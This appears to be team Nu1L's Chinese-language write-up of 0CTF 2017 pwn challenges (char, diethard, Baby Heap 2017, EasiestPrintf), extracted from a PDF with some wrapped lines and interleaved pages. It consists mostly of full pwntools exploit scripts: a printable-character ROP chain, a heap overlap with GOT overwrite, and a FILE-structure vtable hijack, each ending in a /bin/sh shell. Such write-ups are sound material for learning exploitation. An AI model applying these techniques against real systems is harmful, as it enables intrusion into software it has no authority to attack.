0CTF-Writeup
Aut hor-Nu1L
PWN：
char
明显的栈溢出，但输入限制了只能是可打印字符，各种找rop gadget，通过int 0x80执
行execve
EXP:
from pwn import *
VERBOSE = 1
LOCAL = 1
DEBUG = 0
if VERBOSE:
 context.log_level = 'debug'
if LOCAL:
 io = process('./char')
 if DEBUG:
  gdb.attach(io)
else:
 io = remote('202.120.7.214', 23222)
#raw_input('go?')
io.recvuntil('GO : ) \n')
xor_eax = 0x55656b52
inc_eax = 0x555f5b7a
int_80 = 0x55667177
xchg_ebx_edi = 0x55623b42
inc_edx =  0x555e7a4b
mov_eax_edx = 0x555b3454
pop_esi = 0x55686c72
xchg_eax_edi = 0x556f6061
pop_ecx = 0x556d2a51
null = 0x55664128
pop_edx = 0x555f3555
payload = p32(xor_eax) * 8
payload += p32(inc_edx) * 4 + p32(mov_eax_edx) + p32(pop_esi) + p32(xor_eax) + p32(x
chg_eax_edi) + p32(xchg_ebx_edi) + p32(xor_eax) + p32(pop_ecx) + p32(null) + p32(pop
_edx) + p32(null) + p32(null) + (p32(inc_eax) + p32(xor_eax) * 3) * 11 + p32(int_80)
payload += '/bin/sh'
io.sendline(payload)
io.interactive()
0CTF-Writeup
1/22
diethard
程序自己实现了一个堆的分配机制，bins以8的幂来分类，通过bitmap来标志bin是否有
使用，off-by-one修改bitmap产生overlapping chunk，覆盖buffer指针泄漏libc地址，
再改got表执行system(“/bin/sh”)
0CTF-Writeup
2/22
EXP:
from pwn import *
VERBOSE = 1
DEBUG = 0
LOCAL = 1
if VERBOSE:
 context.log_level = 'debug'
if LOCAL:
 io = process('./diethard')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
 io = remote('202.120.7.194', 6666)
 libc = ELF('./libc.so')
def add_msg(len, content):
 io.recvuntil(' 3. Exit\n\n')
 io.sendline('1')
 io.recvuntil('Input Message Length:\n')
 io.sendline(str(len))
 io.recvuntil('Please Input Message:\n')
 io.sendline(content)
def del_msg(id):
 io.recvuntil(' 3. Exit\n\n')
 io.sendline('2')
 io.recvuntil('1. ')
 addr = io.recvn(8)
 io.recv()
 # io.recvuntil('Which Message You Want To Delete?')
 io.sendline(str(id))
 return addr
elf = ELF('./diethard')
payload1 = 'content'
add_msg(len(payload1), payload1)
payload2 = 'A' * 2015
add_msg(len(payload2), payload2)
add_msg(len(payload2), payload2)
payload3 = 'A' * 8 + p64(0x20) + p64(elf.got['puts']) + p64(0x400976)
payload3 = payload3.ljust(2017, 'A')
add_msg(len(payload3), payload3)
puts_addr = del_msg(2)
puts_addr = u64(puts_addr)
system_addr = libc.symbols['system'] - libc.symbols['puts'] + puts_addr
bin_sh_addr = next(libc.search('/bin/sh')) - libc.symbols['puts'] + puts_addr
log.info('puts_addr:%#x' % puts_addr)
log.info('system_addr:%#x' % system_addr)
log.info('bin_sh_addr:%#x' % bin_sh_addr)
del_msg(0)
add_msg(len(payload2), payload2)
payload4 = 'A' * 8 + p64(0) + p64(bin_sh_addr) + p64(system_addr)
payload4 = payload4.ljust(2017, 'A')
add_msg(len(payload4), payload4)
io.recvuntil(' 3. Exit\n\n')
io.sendline('2')
io.recvuntil('1. ')
io.interactive()
0CTF-Writeup
3/22
Baby Heap 2017
跟house of orange很像，但多了free，少了malloc以calloc代替，因此先overlapping
chunk，然后free堆块成fastbin和unsorted bin，来泄漏heap和libc的地址，之后就跟
house of range一样了，unsorted bin attack伪造io_list_all，再calloc失败来执行
system(“/bin/sh”)
EXP:
from pwn import *
VERBOSE = 1
DEBUG = 0
LOCAL = 1
if VERBOSE:
 context.log_level = 'debug'
if LOCAL:
 io = process('./babyheap')
 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 if DEBUG:
  context.aslr = False
  gdb.attach(io)
else:
 io = remote('202.120.7.218', 2017)
 libc = ELF('./libc.so.6')
def allocate(size):
 io.recvuntil('Command: ')
 io.sendline('1')
 io.recvuntil('Size: ')
 io.sendline(str(size))
def fill(index, size, content):
 io.recvuntil('Command: ')
 io.sendline('2')
 io.recvuntil('Index: ')
 io.sendline(str(index))
 io.recvuntil('Size: ')
 io.sendline(str(size))
 io.recvuntil('Content: ')
 io.send(content)
def delete(index):
 io.recvuntil('Command: ')
 io.sendline('3')
 io.recvuntil('Index: ')
 io.sendline(str(index))
def dump(index):
 io.recvuntil('Command: ')
 io.sendline('4')
 io.recvuntil('Index: ')
 io.sendline(str(index))
 data = io.recvuntil('1. Allocate')
 return data
#raw_input('go?')
0CTF-Writeup
4/22
allocate(0x100 - 8)
allocate(0x100 - 8)
allocate(0x80 - 8)
allocate(0x80 - 8)
allocate(0x100 - 8)
allocate(0x100 - 8)
allocate(0x100 - 8)
allocate(0x100 - 8)
delete(1)
payload1 = 'A' * 0xf0 + p64(0) + p64(0x181)
fill(0, len(payload1), payload1)
allocate(0x180 - 8)
payload2 = 'A' * 0xf0 + p64(0) + p64(0x81)
fill(1, len(payload2), payload2)
delete(3)
delete(2)
heap_addr = u64(dump(1)[0x10a:0x10a+8])
delete(5)
payload3 = 'A' * 0xf0 + p64(0) + p64(0x201)
fill(4, len(payload3), payload3)
allocate(0x200 - 8)
payload4 = 'A' * 0xf0 + p64(0) + p64(0x101)
fill(2, len(payload4), payload4)
delete(6)
libc_addr = u64(dump(2)[0x10a:0x10a+8])
if LOCAL:
    libc_addr = libc_addr - (0x2aaaab08e7b8 - 0x2aaaaacd0000)
else:
    libc_addr = libc_addr - (0x7f3007003678 - 0x7f3006c5e000)
system = libc_addr + libc.symbols['system']
io_list_all = libc_addr + libc.symbols['_IO_list_all']
vtable_addr = heap_addr + (0x555555757c08 - 0x555555757280)
log.info('libc_addr:%#x' % libc_addr)
log.info('heap_addr:%#x' % heap_addr)
log.info('system:%#x' % system)
log.info('io_list_all:%#x' % io_list_all)
log.info('vtable_addr:%#x' % vtable_addr)
payload1 = 'A' * 0xf0 + p64(0) + p64(0x901)
fill(7, len(payload1), payload1)
allocate(0x1000)
allocate(0x400)
payload = "A" * 0x400
stream = "/bin/sh\x00" + p64(0x61) # fake file stream
stream += p64(0xddaa) + p64(io_list_all-0x10) # Unsortbin attack
stream = stream.ljust(0xa0,"\x00")
stream += p64(vtable_addr-0x28)
stream = stream.ljust(0xc0,"\x00")
stream += p64(1)
payload += stream
payload += p64(0)
payload += p64(0)
payload += p64(vtable_addr)
payload += p64(1)
payload += p64(2)
payload += p64(3) 
payload += p64(0)*3 # vtable
payload += p64(system)
0CTF-Writeup
5/22
.EasiestPrintf
可以泄漏一个地址的数据，之后就是fsb，泄漏stdout，然后跟上题类似攻击file结构体
覆盖vtable
payload += p64(system)
fill(5, len(payload), payload)
allocate(0x4d0 - 8)
io.recv()
io.interactive()
EXP：
from pwn import *
VERBOSE = 1
DEBUG = 0
LOCAL = 1
if VERBOSE:
    context.log_level = 'debug'
if LOCAL:
    io = process('./EasiestPrintf')
    libc = ELF('/lib32/libc.so.6')
    if DEBUG:
        gdb.attach(io)
else:
    io = remote('202.120.7.210', 12321)